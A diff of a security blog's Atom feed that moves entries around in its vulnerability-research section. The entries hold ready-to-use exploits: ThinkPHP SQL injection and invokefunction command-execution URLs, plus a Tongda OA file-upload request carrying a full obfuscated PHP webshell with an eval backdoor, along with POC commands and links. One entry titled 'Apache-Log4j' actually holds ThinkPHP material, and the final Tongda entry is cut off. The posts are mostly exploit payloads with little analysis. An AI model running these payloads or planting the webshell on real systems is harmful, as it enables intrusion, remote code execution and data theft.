@@ -227,33 +227,6 @@
   </entry>
   
   <entry>
-    <title>Apache-Log4j</title>
-    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/"/>
-    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/</id>
-    <published>2020-12-14T01:55:31.846Z</published>
-    <updated>2020-12-14T03:11:07.650Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p>ThinkPHP是国内一款常用的PHP后台开发框架。</p><h2 id="ThinkPHP-3-2-SQL注入"><a href="#ThinkPHP-3-2-SQL注入" class="headerlink" title="[ThinkPHP 3.2]-SQL注入"></a>[ThinkPHP 3.2]-SQL注入</h2><p><strong>漏洞利用</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--table</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--alias</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--where:</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-x-命令执行漏洞"><a href="#ThinkPHP-5-x-命令执行漏洞" class="headerlink" title="[ThinkPHP 5.x]-命令执行漏洞"></a>[ThinkPHP 5.x]-命令执行漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">5.0 &lt; 5.0.24</span><br><span class="line">5.1 &lt; 5.1.31</span><br></pre></td></tr></table></figure><p>由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。</p><p><strong>漏洞利用</strong></p><p>phpinfo：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p>命令执行：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><h2 id="5-0-注入"><a href="#5-0-注入" class="headerlink" title="5.0 注入"></a>5.0 注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># thinphp 5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 </span></span><br><span class="line"><span class="comment">#insert注入</span></span><br><span class="line">还是exp同类的问题,如果有inc或者dec,val[2]强转了,vak[1]没处理</span><br><span class="line"></span><br><span class="line">index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 5.1.8 版本也可利用)。</span></span><br><span class="line"><span class="comment">#insert注入</span></span><br><span class="line">还是上面同一个地方,,加了default 处理,根进去,还是直接拼接了sql语句</span><br><span class="line">index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </span><br><span class="line"></span><br><span class="line"><span class="comment"># ThinkPHP5全版本 。</span></span><br><span class="line">Mysql 类的 parseWhereItem 方法中,</span><br><span class="line">需要exp,本来就是官方执行语句的参数,然后没有过滤)导致可以逃出原本执行,进入联合查询啥的</span><br><span class="line">index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  ThinkPHP=5.0.10</span></span><br><span class="line">Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字</span><br><span class="line">导致<span class="built_in">where</span>([<span class="string">'username'</span> =&gt; <span class="variable">$username</span>])</span><br><span class="line">username 传入数组可以注入,</span><br><span class="line">NOT LIKE 第三个参数可以指定多个like查询的关系,如 and </span><br><span class="line">插入sql语句,导致注入..</span><br><span class="line"></span><br><span class="line"> http://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()--+</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 5.1.16&lt;=ThinkPHP5&lt;=5.1.22  order 注入</span></span><br><span class="line">parsrorder 没过滤,数组拼接注入`逃逸</span><br><span class="line">index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 </span><br><span class="line"> </span><br><span class="line"><span class="comment">#  5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25 聚合函数注入</span></span><br><span class="line"><span class="comment">#5.0.0~5.0.21 、 5.1.3～5.1.10</span></span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br><span class="line"></span><br><span class="line"><span class="comment">#5.1.11～5.1.25</span></span><br><span class="line">id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br><span class="line"> </span><br><span class="line">max 聚合函数,传入表名的位置,``包裹,所以存在注入,修复方法,进行匹配,阻止数字,字母,*以为的字符</span><br></pre></td></tr></table></figure><h2 id="5-0-24存在反序列化"><a href="#5-0-24存在反序列化" class="headerlink" title="5.0.24存在反序列化"></a>5.0.24存在反序列化</h2><p>这是个鸡肋漏洞，很难利用</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;ThinkPHP是国内一款常用的PHP后台开发框架。&lt;/p&gt;
-&lt;h2 id=&quot;ThinkPHP-3-2-SQL注入&quot;&gt;&lt;a 
-      
-    
-    </summary>
-    
-    
-      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
-    
-      <category term="ThinkPHP" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>Seeyon-OA(致远)</title>
     <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/"/>
     <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/</id>
@@ -281,19 +254,20 @@
   </entry>
   
   <entry>
-    <title>Tongda-OA(通达)</title>
-    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/"/>
-    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/</id>
+    <title>Apache-Log4j</title>
+    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/"/>
+    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/</id>
     <published>2020-12-14T01:55:31.846Z</published>
-    <updated>2020-12-12T00:23:19.459Z</updated>
+    <updated>2020-12-14T03:11:07.650Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p><a href="https://www.tongda2000.com/" target="_blank" rel="noopener">通达OA</a>，协同办公平台</p><h2 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a>前台任意文件上传</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响版本</span><br><span class="line"><span class="attribute">2016-11.6</span></span><br></pre></td></tr></table></figure><p><strong>漏洞利用-EXP</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/module/ueditor/php/action_upload.php?action=uploadfile</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Length</span>: 879</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileFieldName]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">ff</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileMaxSize]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1000000000</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[filePathFormat]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">Api/conf</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileAllowFiles][]"</span><br><span class="line"></span><br><span class="line">.php</span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ff"; filename="xxxaaaa.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">    function E($D,$K)&#123;</span><br><span class="line">        for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">            $D[$i] = $D[$i]^$K[$i+1&amp;15];</span><br><span class="line">        &#125;</span><br><span class="line">        return $D;</span><br><span class="line">    &#125;</span><br><span class="line">    function Q($D)&#123;</span><br><span class="line">        return base64_encode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    function O($D)&#123;</span><br><span class="line">        return base64_decode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    $P='PASS_1z';</span><br><span class="line">    $V='payload';</span><br><span class="line">    $T='3c6e0b8a9c15224a';</span><br><span class="line">    if (isset($_POST[$P]))&#123;</span><br><span class="line">        $F=O(E(O($_POST[$P]),$T));</span><br><span class="line">        if (isset($_SESSION[$V]))&#123;</span><br><span class="line">            $L=$_SESSION[$V];</span><br><span class="line">            $A=explode('|',$L);</span><br><span class="line">            class C&#123;public function nvoke($p) &#123;eval($p."");&#125;&#125;</span><br><span class="line">            $R=new C();</span><br><span class="line">$R-&gt;nvoke($A[0]);</span><br><span class="line">            echo substr(md5($P.$T),0,16);</span><br><span class="line">            echo Q(E(@run($F),$T));</span><br><span class="line">            echo substr(md5($P.$T),16);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[$V]=$F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="mufile"</span><br><span class="line"></span><br><span class="line">提交查询</span><br><span class="line">-----------------------------157569659620694477453109954647--</span><br></pre></td></tr></table></figure><p>Webshell地址：127.0.0.1/api/conf.php，exp中api/conf表示api为文件上传后的路径，conf为文件名</p><h2 id="11-5-前台任意用户伪造登录漏洞"><a href="#11-5-前台任意用户伪造登录漏洞" class="headerlink" title="[11.5]-前台任意用户伪造登录漏洞"></a>[11.5]-前台任意用户伪造登录漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">通达OA &lt; 11.5</span><br><span class="line">通达OA = 2017</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>1、使用<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User#tongdaoa-fake-user" target="_blank" rel="noopener">POC</a>获取Cookie</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 poc.py -v 11 -url http://xxx.com</span><br></pre></td></tr></table></figure><p>2、浏览器插件<code>Cookie-Editor</code>替换Cookie即可登录</p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>11.5（未授权和SQL注入的POC）</strong></p><p><a href="https://4m.cn/1XlPK" target="_blank" rel="noopener">https://4m.cn/1XlPK</a></p><h2 id="11-6-未授权RCE-危险操作"><a href="#11-6-未授权RCE-危险操作" class="headerlink" title="[11.6]-未授权RCE(危险操作)"></a>[11.6]-未授权RCE(危险操作)</h2><p><strong>漏洞概述</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line"><span class="attribute">V11.6</span></span><br></pre></td></tr></table></figure><p>通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传</p><p><strong>漏洞利用</strong></p><p>POC下载：<a href="https://github.com/TomAPU/poc_and_exp/blob/master/rce.py" target="_blank" rel="noopener">https://github.com/TomAPU/poc_and_exp/blob/master/rce.py</a></p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>漏洞分析</strong></p><p><a href="https://xz.aliyun.com/t/8430" target="_blank" rel="noopener">https://xz.aliyun.com/t/8430</a></p><h2 id="全版本-文件上传-文件包含GetShell"><a href="#全版本-文件上传-文件包含GetShell" class="headerlink" title="[全版本]-文件上传+文件包含GetShell"></a>[全版本]-文件上传+文件包含GetShell</h2><p><strong>漏洞概述</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line"><span class="attribute">V11</span></span><br><span class="line"><span class="attribute">2017</span></span><br><span class="line"><span class="attribute">2016</span></span><br><span class="line"><span class="attribute">2015</span></span><br><span class="line"><span class="attribute">2013</span></span><br><span class="line"><span class="attribute">2013增强版</span></span><br></pre></td></tr></table></figure><p>通过绕过身份认证（或弱口令）, 攻击者可上传任意文件，配合文件包含即可出发远程恶意代码执行</p><p><strong>漏洞利用</strong></p><p>POC：</p><p><a href="https://github.com/ghtwf01/td_rce" target="_blank" rel="noopener">https://github.com/ghtwf01/td_rce</a></p><p><a href="https://github.com/php00py/tongdaOA" target="_blank" rel="noopener">https://github.com/php00py/tongdaOA</a></p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>漏洞分析</strong></p><p><a href="https://xz.aliyun.com/t/7437" target="_blank" rel="noopener">https://xz.aliyun.com/t/7437</a></p><h2 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h2><p>🔸 <a href="https://www.cnblogs.com/yuzly/p/13606314.html" target="_blank" rel="noopener">通达OA 11.2后台getshell</a><br>🔸 <a href="https://www.cnblogs.com/yuzly/p/13690737.html" target="_blank" rel="noopener">通达OA 11.7 后台sql注入getshell漏洞</a></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p>ThinkPHP是国内一款常用的PHP后台开发框架。</p><h2 id="ThinkPHP-3-2-SQL注入"><a href="#ThinkPHP-3-2-SQL注入" class="headerlink" title="[ThinkPHP 3.2]-SQL注入"></a>[ThinkPHP 3.2]-SQL注入</h2><p><strong>漏洞利用</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--table</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--alias</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--where:</span></span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)<span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-x-命令执行漏洞"><a href="#ThinkPHP-5-x-命令执行漏洞" class="headerlink" title="[ThinkPHP 5.x]-命令执行漏洞"></a>[ThinkPHP 5.x]-命令执行漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">5.0 &lt; 5.0.24</span><br><span class="line">5.1 &lt; 5.1.31</span><br></pre></td></tr></table></figure><p>由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。</p><p><strong>漏洞利用</strong></p><p>phpinfo：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p>命令执行：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><h2 id="5-0-注入"><a href="#5-0-注入" class="headerlink" title="5.0 注入"></a>5.0 注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># thinphp 5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 </span></span><br><span class="line"><span class="comment">#insert注入</span></span><br><span class="line">还是exp同类的问题,如果有inc或者dec,val[2]强转了,vak[1]没处理</span><br><span class="line"></span><br><span class="line">index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 5.1.8 版本也可利用)。</span></span><br><span class="line"><span class="comment">#insert注入</span></span><br><span class="line">还是上面同一个地方,,加了default 处理,根进去,还是直接拼接了sql语句</span><br><span class="line">index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </span><br><span class="line"></span><br><span class="line"><span class="comment"># ThinkPHP5全版本 。</span></span><br><span class="line">Mysql 类的 parseWhereItem 方法中,</span><br><span class="line">需要exp,本来就是官方执行语句的参数,然后没有过滤)导致可以逃出原本执行,进入联合查询啥的</span><br><span class="line">index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  ThinkPHP=5.0.10</span></span><br><span class="line">Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字</span><br><span class="line">导致<span class="built_in">where</span>([<span class="string">'username'</span> =&gt; <span class="variable">$username</span>])</span><br><span class="line">username 传入数组可以注入,</span><br><span class="line">NOT LIKE 第三个参数可以指定多个like查询的关系,如 and </span><br><span class="line">插入sql语句,导致注入..</span><br><span class="line"></span><br><span class="line"> http://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()--+</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 5.1.16&lt;=ThinkPHP5&lt;=5.1.22  order 注入</span></span><br><span class="line">parsrorder 没过滤,数组拼接注入`逃逸</span><br><span class="line">index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 </span><br><span class="line"> </span><br><span class="line"><span class="comment">#  5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25 聚合函数注入</span></span><br><span class="line"><span class="comment">#5.0.0~5.0.21 、 5.1.3～5.1.10</span></span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br><span class="line"></span><br><span class="line"><span class="comment">#5.1.11～5.1.25</span></span><br><span class="line">id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br><span class="line"> </span><br><span class="line">max 聚合函数,传入表名的位置,``包裹,所以存在注入,修复方法,进行匹配,阻止数字,字母,*以为的字符</span><br></pre></td></tr></table></figure><h2 id="5-0-24存在反序列化"><a href="#5-0-24存在反序列化" class="headerlink" title="5.0.24存在反序列化"></a>5.0.24存在反序列化</h2><p>这是个鸡肋漏洞，很难利用</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.tongda2000.com/&quot; target=&quot;_blank&quot; rel=&quot;noo
+        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;ThinkPHP是国内一款常用的PHP后台开发框架。&lt;/p&gt;
+&lt;h2 id=&quot;ThinkPHP-3-2-SQL注入&quot;&gt;&lt;a 
       
     
     </summary>
@@ -301,7 +275,7 @@
     
       <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
     
-      <category term="Tongda-OA(通达)" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA-%E9%80%9A%E8%BE%BE/"/>
+      <category term="ThinkPHP" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/"/>
     
     
   </entry>
@@ -328,6 +302,32 @@
       <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
     
       <category term="Weaver-Ecology-OA(泛微)" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weaver-Ecology-OA-%E6%B3%9B%E5%BE%AE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Tongda-OA(通达)</title>
+    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/"/>
+    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/</id>
+    <published>2020-12-14T01:55:31.846Z</published>
+    <updated>2020-12-12T00:23:19.459Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p><a href="https://www.tongda2000.com/" target="_blank" rel="noopener">通达OA</a>，协同办公平台</p><h2 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a>前台任意文件上传</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响版本</span><br><span class="line"><span class="attribute">2016-11.6</span></span><br></pre></td></tr></table></figure><p><strong>漏洞利用-EXP</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/module/ueditor/php/action_upload.php?action=uploadfile</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Length</span>: 879</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileFieldName]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">ff</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileMaxSize]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1000000000</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[filePathFormat]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">Api/conf</span></span><br><span class="line"><span class="attribute">-----------------------------157569659620694477453109954647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="CONFIG[fileAllowFiles][]"</span><br><span class="line"></span><br><span class="line">.php</span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ff"; filename="xxxaaaa.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">    function E($D,$K)&#123;</span><br><span class="line">        for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">            $D[$i] = $D[$i]^$K[$i+1&amp;15];</span><br><span class="line">        &#125;</span><br><span class="line">        return $D;</span><br><span class="line">    &#125;</span><br><span class="line">    function Q($D)&#123;</span><br><span class="line">        return base64_encode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    function O($D)&#123;</span><br><span class="line">        return base64_decode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    $P='PASS_1z';</span><br><span class="line">    $V='payload';</span><br><span class="line">    $T='3c6e0b8a9c15224a';</span><br><span class="line">    if (isset($_POST[$P]))&#123;</span><br><span class="line">        $F=O(E(O($_POST[$P]),$T));</span><br><span class="line">        if (isset($_SESSION[$V]))&#123;</span><br><span class="line">            $L=$_SESSION[$V];</span><br><span class="line">            $A=explode('|',$L);</span><br><span class="line">            class C&#123;public function nvoke($p) &#123;eval($p."");&#125;&#125;</span><br><span class="line">            $R=new C();</span><br><span class="line">$R-&gt;nvoke($A[0]);</span><br><span class="line">            echo substr(md5($P.$T),0,16);</span><br><span class="line">            echo Q(E(@run($F),$T));</span><br><span class="line">            echo substr(md5($P.$T),16);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[$V]=$F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">-----------------------------157569659620694477453109954647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="mufile"</span><br><span class="line"></span><br><span class="line">提交查询</span><br><span 